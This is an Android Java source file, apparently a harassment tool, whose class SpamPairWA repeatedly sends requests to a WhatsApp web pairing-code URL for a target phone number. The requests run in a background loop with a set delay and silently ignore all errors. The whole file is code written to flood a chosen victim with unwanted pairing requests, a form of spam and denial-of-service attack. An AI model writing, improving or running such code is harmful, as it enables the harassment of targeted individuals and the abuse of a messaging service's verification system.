package com.manta.x;

import android.content.Context;
import android.os.AsyncTask;
import java.net.HttpURLConnection;
import java.net.URL;

public class SpamPairWA {
    public static void startSpam(Context ctx, String target, int delayMs, int loop) {
        new AsyncTask<Void,Void,Void>(){
            @Override
            protected Void doInBackground(Void... voids) {
                for (int i=0; i<loop; i++) {
                    try {
                        URL url = new URL("https://web.whatsapp.com/code?phone="+target);
                        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                        conn.setRequestMethod("GET");
                        conn.connect();
                        conn.getInputStream().close();
                        Thread.sleep(delayMs);
                    } catch (Exception e) {}
                }
                return null;
            }
        }.execute();
    }
}